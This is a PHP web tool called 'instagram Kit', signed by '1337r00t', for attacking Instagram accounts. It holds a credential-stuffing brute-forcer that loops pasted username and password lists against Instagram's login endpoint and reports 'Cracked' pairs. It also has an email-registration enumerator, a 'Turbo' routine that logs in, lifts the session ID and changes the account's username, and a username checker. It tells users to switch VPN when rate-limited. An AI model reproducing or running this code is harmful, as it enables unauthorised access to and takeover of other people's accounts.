<?php
echo '
<html>
<title>instagram Kit</title><link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/b407fa101800.png" type="image/x-icon" />
<body style="background-color:black;">
<style type="text/css">
body {
background:
url("") repeat , 
url("") no-repeat center top,top left,top right;
background-color: #000000;
}
a{
text-decoration:none;
border:1px solid #12549c;
border-radius:5px;
background-color:black;
color:white;
font-family:Arial;
font-size:17;
box-shadow: 0px 0px 12px #21a0ed;
}
#c{
border-bottom:1px solid #12549c;
}
</style>
<style type="text/css">
html {
        background: url(https://cdn-d4d.kxcdn.com/wp-content/uploads/2015/07/hacker_wallpapers-1.jpg) no-repeat center center fixed;
        -webkit-background-size: cover;
        -moz-background-size: cover;
        -o-background-size: cover;
        background-size: cover;
}
</style>
<style>
input[type=text] {
    padding:5px;
    border:2px solid #ccc;
    -webkit-border-radius: 5px;
    border-radius: 5px;
}
 
input[type=text]:focus {
    border-color:#333;
}
 
input[type=submit] {
    padding:5px 15px;
    background:#ccc;
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 5px;
    border-radius: 5px;
}
</style>
<head>
</body>
</html>
<center><font color="white" face="impact" size="7" align="center">instagramKit</font></center>
';

echo '<center><img src="https://www.instagram.com/static/images/ico/favicon-192.png/b407fa101800.png"></center>';

echo '<center><font color="#007700" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">';

echo '</font></b></div><br></center>';

?>
<div id="det" align="center">

</div>
</center>
<div id="c" align="center">
<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">Home</a></font>
<a href="?instagram=Login">Login Your Account</a></font>
<a href="?instagram=Brute">Brute Force</a></font>
<a href="?instagram=taken">scanner Emails taken</a></font>
<a href="?instagram=turbo">Turbo</a></font>
<a href="?instagram=checker">Checker</a></font>
</div><br>
<?php 
if(isset($_GET['instagram']) && $_GET['instagram'] == 'Login'){
////////////////////////////////////////////////////////
# Login
echo '
<style>
textarea {
	resize:none;
	color: #1975FF ;
	border:1px solid #1975FF ;
	border-left: 4px solid #1975FF ;
}
input {
	color: ##33CCFF;
	border:1px dotted #33CCFF;
}
</style>
<p><center><font face="impact" color="White" size="4">Checker Emails
</center><center></font><br>
<title>Login</title>
<form method="post">
<font color="white">Username : <br><input type="text" name="username"><br>Password : <br><input type="text" name="password"><br></font>
<input type="submit" value="Login">
</form><br>
';
$username = $_POST['username'];
$password = $_POST['password'];
$login = curl_init(); 
curl_setopt($login, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/"); 
curl_setopt($login, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($login, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($login, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($login, CURLOPT_HTTPHEADER, array(
    'Host: www.instagram.com',
    'X-CSRFToken: EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I',
    'X-Instagram-AJAX: 1',
    'X-Requested-With: XMLHttpRequest',
    'Referer: https://www.instagram.com/',
    'Cookie: csrftoken=EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I;'
    ));
curl_setopt($login, CURLOPT_POSTFIELDS, "username=$username&password=$password");
curl_setopt($login, CURLOPT_HEADER, 1);
curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$response = curl_exec($login);
if(eregi('"authenticated": true,', $response))
	{
		echo "<center><font color='grenn'>Logged -> $username:$password </font></center>";
	}
	else
	{
		if(eregi("checkpoint", $response))
		{
			echo "<center><font color='white'>Logged But CheckPoint :( -> $username:$password </font></center>";
		}
		else
		{
			if(eregi("Please wait a few minutes before you try again.", $response))
			{
				echo "<center><font color='pink'> Use Proxy </font></center>";
			}
			else
			{
				echo "<center><font color='red'> Failed -> $username:$password</font> </center>";
			}
		}
	}
curl_close($login);
////////////////////////////////////////////////////////
}
if(isset($_GET['instagram']) && $_GET['instagram'] == 'Brute'){
# Brute Force
////////////////////////////////////////////////////////
echo '
<style>
textarea {
	resize:none;
	color: #1975FF ;
	border:1px solid #1975FF ;
	border-left: 4px solid #1975FF ;
}
input {
	color: ##33CCFF;
	border:1px dotted #33CCFF;
}
</style>
<p><center><font face="impact" color="White" size="4">instagram Brute Force
</center><center></font><br>
<title>instagram Brute Force</title>
<form method="post">
<font color="white">
Usernames :-<br>
<textarea name="users" style="resize:none;" class="area" cols="45" rows="10"></textarea>
<br>
Passwords :-<br>
<textarea name="passs" style="resize:none;" class="area" cols="45" rows="10"></textarea>
<br></font>
<input type="submit" value="Cracking">
</form><br>
';
$users = explode("\r\n", htmlentities($_POST['users']));
$passs = explode("\r\n", htmlentities($_POST['passs']));
foreach($users as $username)
{
foreach($passs as $password)
{
$passtext = base64_encode($password);
$brute = curl_init(); 
curl_setopt($brute, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/"); 
curl_setopt($brute, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($brute, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($brute, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($brute, CURLOPT_HTTPHEADER, array(
    'Host: www.instagram.com',
    'X-CSRFToken: EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I',
    'X-Instagram-AJAX: 1',
    'X-Requested-With: XMLHttpRequest',
    'Referer: https://www.instagram.com/',
    'Cookie: csrftoken=EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I;'
    ));
curl_setopt($brute, CURLOPT_POSTFIELDS, "username=$username&password=$password");
curl_setopt($brute, CURLOPT_HEADER, 1);
curl_setopt($brute, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$source = curl_exec($brute);
if(eregi('"authenticated": true,', $source))
	{
		echo "<center><font color='green'>(Cracked -> $username:$password)<br></font></center>";
	}
	else
	{
		if(eregi("checkpoint", $source))
		{
			echo "<center><font color='white'>(CheckPoint :( -> $username:$password)<br></font></center>";
		}
		else
		{
			if(eregi("Please wait a few minutes before you try again.", $source))
			{
				echo "<center> Use VPN Plz <br></center>";
			}
			else
			{
				echo "<center><font color='red'> Failed -> ($username:$password)<br></font></center>";
			}
		}
	}
}}
curl_close($brute);
////////////////////////////////////////////////////////
}
if(isset($_GET['instagram']) && $_GET['instagram'] == 'taken'){

echo '
<style>
textarea {
	resize:none;
	color: #1975FF ;
	border:1px solid #1975FF ;
	border-left: 4px solid #1975FF ;
}
input {
	color: ##33CCFF;
	border:1px dotted #33CCFF;
}
</style>
<p><center><font face="impact" color="White" size="4">Reset Password
</center><center></font><br>
<title>instagram Reset Password</title>
<form method="post">
<font color="white">Email : <br><textarea name="emails" style="resize:none;"></textarea><br><br></font>
<input type="submit" value="checking">
</form><br>
';

$emails = explode("\r\n", htmlentities($_POST['emails']));
foreach($emails as $email)
{
$reset = curl_init(); 
curl_setopt($reset, CURLOPT_URL, "https://www.instagram.com/accounts/fb_linked_account/?check_email=$email"); 
curl_setopt($reset, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($reset, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($reset, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($reset, CURLOPT_HEADER, 1);
$reseted = curl_exec($reset);
if(eregi('{"email_taken": true, "status": "ok"}', $reseted))
	{
		echo "<center><font color='red'>Taken :-> $email <br></font></center>";
	}
	else
	{
		echo "<center><font color='green'>Not Taken -> $email </font></center><br>";
	}
}
curl_close($reset);
}
#
if(isset($_GET['instagram']) && $_GET['instagram'] == 'turbo'){
ob_start();

echo '
<style>
textarea {
	resize:none;
	color: #1975FF ;
	border:1px solid #1975FF ;
	border-left: 4px solid #1975FF ;
}
input {
	color: ##33CCFF;
	border:1px dotted #33CCFF;
}
</style>
<p><center><font face="impact" color="White" size="4">Turbo instagram
</center><center></font><br>
<title>instagram Turbo</title>
<form method="post">
<font color="white">
Your Username : <input type="text" name="username"><br>
Your Password : <input type="text" name="password"><br>
Your Email : <input type="text" name="email"><br>
</font>
<input type="submit" value="Login">
</form><br>
';
////////////////////////////////////////////////////
$username = $_POST['username'];
$password = $_POST['password'];
$email = $_POST['email'];
$turbo = curl_init(); 
curl_setopt($turbo, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/"); 
curl_setopt($turbo, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($turbo, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($turbo, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($turbo, CURLOPT_HTTPHEADER, array(
    'Host: www.instagram.com',
    'X-CSRFToken: EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I',
    'X-Instagram-AJAX: 1',
    'X-Requested-With: XMLHttpRequest',
    'Referer: https://www.instagram.com/',
    'Cookie: csrftoken=EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I;'
    ));
curl_setopt($turbo, CURLOPT_POSTFIELDS, "username=$username&password=$password");
curl_setopt($turbo, CURLOPT_HEADER, 1);
curl_setopt($turbo, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$linked = curl_exec($turbo);
if(eregi('"authenticated": true,', $linked))
	{
		echo "<center><font color='green'>(Cracked -> $username:$password)<br>Now change user<br></font></center>";
		$starttoken = explode('sessionid=' , $linked );
		$endtoken = explode(';' , $starttoken[1] );
		$token = $endtoken[0];
		////////////////////////////////////////////////////////////
		$html = file_get_contents("https://www.instagram.com/$username");
		#####
		$startname = explode('"full_name": "' , $html );
		$endname = explode(';' , $startname[1] );
		$name = $endname[0];
		####################################################
		$startbio = explode('"biography": "' , $html );
		$endbio = explode('","' , $startbio[1] );
		$bio = $endbio[0];
		####################################################
		echo '
<style>
textarea {
	resize:none;
	color: #1975FF ;
	border:1px solid #1975FF ;
	border-left: 4px solid #1975FF ;
}
input {
	color: ##33CCFF;
	border:1px dotted #33CCFF;
}
</style>
<p><center><font face="impact" color="White" size="4">input new username
</center><center></font><br>
<form method="post">
<font color="white">
New Username : <input type="text" name="newusername"><br>
</font>
<input type="submit" value="go now">
</form><br>
';
		$newusername = $_POST['newusername'];
		$pind = curl_init(); 
		curl_setopt($pind, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/"); 
		curl_setopt($pind, CURLOPT_SSL_VERIFYPEER, false); 
		curl_setopt($pind, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($pind, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($pind, CURLOPT_HTTPHEADER, array(
		    'Host: www.instagram.com',
		    'X-CSRFToken: or0B3kxAzK6Umh2kr0pc65u5kJktk1hT',
		    'X-Instagram-AJAX: 1',
		    'Content-Type: application/x-www-form-urlencoded',
		    'X-Requested-With: XMLHttpRequest',
		    "Cookie: csrftoken=or0B3kxAzK6Umh2kr0pc65u5kJktk1hT; sessionid=$token;",
			'Connection: keep-alive'
		    ));
		curl_setopt($pind, CURLOPT_POSTFIELDS, "first_name=$name&email=$email&username=$newusername&phone_number=&gender=1&biography=$bio&external_url=&chaining_enabled=on");
		curl_setopt($pind, CURLOPT_HEADER, 1);
		curl_setopt($pind, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		$pinded = curl_exec($pind);
		if(eregi('{"status": "ok"}', $pinded))
			{
				echo "<center><font color='white'>changed username : https://www.instagram.com/$newusername<br></font></center>";
			}
			else
			{
				echo "<center><font color='red'>error error check now your username<br></font></center>";
			}
	}
	else
	{
		echo "<center><font color='green'>Failed Login Or CheckPoint<br></font></center>";
	}
curl_close($turbo);
}
if(isset($_GET['instagram']) && $_GET['instagram'] == 'checker'){

echo '
<style>
textarea {
	resize:none;
	color: #1975FF ;
	border:1px solid #1975FF ;
	border-left: 4px solid #1975FF ;
}
input {
	color: ##33CCFF;
	border:1px dotted #33CCFF;
}
</style>
<p><center><font face="impact" color="White" size="4">Checker Username
</center><center></font><br>
<title>instagram Checker</title>
<form action="" method="post">
<center>=
<font color="red"> Usernames :<textarea cols="10" rows="6" type="text" name="usernames"></textarea></font><br><br>
<input type="submit" value="Checking">
</center>
</form><br>
';
$usernames = explode("\r\n", htmlentities($_POST['usernames']));
foreach($usernames as $username)
{
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_URL, "https://www.instagram.com/accounts/web_create_ajax/"); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'Host: www.instagram.com',
		'X-CSRFToken: EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I',
		'X-Instagram-AJAX: 1',
		'X-Requested-With: XMLHttpRequest',
		'Referer: https://www.instagram.com/',
		'Cookie: csrftoken=EJMrAsTOEi1SKiZLHzNf2RMBEZTQkI9I;'
		));
	curl_setopt($ch, CURLOPT_POSTFIELDS, "email=a@hotmail.com&password=1234&username=$username&first_name=aaa");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	$check = curl_exec($ch);
	if(eregi("Sorry, that username is taken.", $check))
		{
			echo "<center><font color='red'> Taken -> $username <br></font></center>";
		}
		else
		{
			if(eregi("Your username cannot contain only numbers.", $check))
				{
					echo "<center><font color='blue'> Your username cannot contain only numbers :( -> $username <br></font></center>";
				}
				else
				{
					if(eregi("A user with that username already exists.", $check))
						{
							echo "<center><font color='pink' Blocked -> $username <br></font></center>";
						}
						else
						{
							echo "<center><font color='green' Available -> $username <br></font></center>";
						}
				}
		}
}
curl_close($ch);
}
ob_end_flush(); 
echo '<center><font color="red" face="arial" size="2" align="">Instagram Kit : Coded By 1337r00t</font></center>'; 
?>
